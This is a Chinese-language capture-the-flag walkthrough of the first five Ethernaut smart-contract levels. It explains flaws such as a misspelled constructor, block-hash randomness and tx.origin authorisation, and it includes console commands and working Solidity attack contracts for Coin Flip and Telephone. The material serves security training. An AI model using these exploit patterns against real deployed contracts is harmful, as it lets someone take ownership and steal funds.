# 1 Hello Ethernaut

可以直接在控制台里输入contrac查看ABI的methods

await contract.password() 查看密码
'ethernaut0'
await contract.authenticate('ethernaut0') 输入密码
submit instance 

# 2 Fallback

阅读智能合约代码 receive() 可以修改owner, 修改owner后call withdraw()即可

2.1. await contract.contribute({value: 1})
call 完后查看是否有balance，就可以send了
2.2. await contract.getContribution()
1
2.3. 转 1 ether 
await contract.send(1)
2.4. await contract.owner()
'0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
# 最后一步，把钱取出来
2.5. await contract.withdraw()
submit instance 

# 3 Fallout

错误的构造函数拼写(1)

```
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

3.1. await contract.Fal1out()
3.2. await contract.owner()
'0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
submit instance

# 4 Coin Flip

错误的使用blocknumber作为随机数

```
    function flip(bool _guess) public {
        uint blockValue = uint(blockhash(block.number-1));
        uint coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
            totalWins[msg.sender]++;
        }
    }
```

编写攻击合约

```
pragma solidity ^0.8.0;

interface IChallenge {
    function flip(bool _guess) external payable returns (bool);
}

contract CoinFlipAttack {
    IChallenge challenge;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        challenge.flip(side);
    }
}
```
部署合约（challenge address为目标合约）, 然后call 10次flip()即可
await contract.consecutiveWins()
10

submit instance

# 5 Telephone

```
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

其中

tx.origin 是最初发起交易的地址
msg.sender 是当前调用者的地址
因此通过中间合约调用即可修改owner

编写攻击合约

```
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function attackChangeOwner(address _newOwner) public {
        Telephone(targetContract).changeOwner(_newOwner);
    }
}
```
call attackChangeOwner("你的地址")即可
await contract.owner()
'你的地址'
submit instance


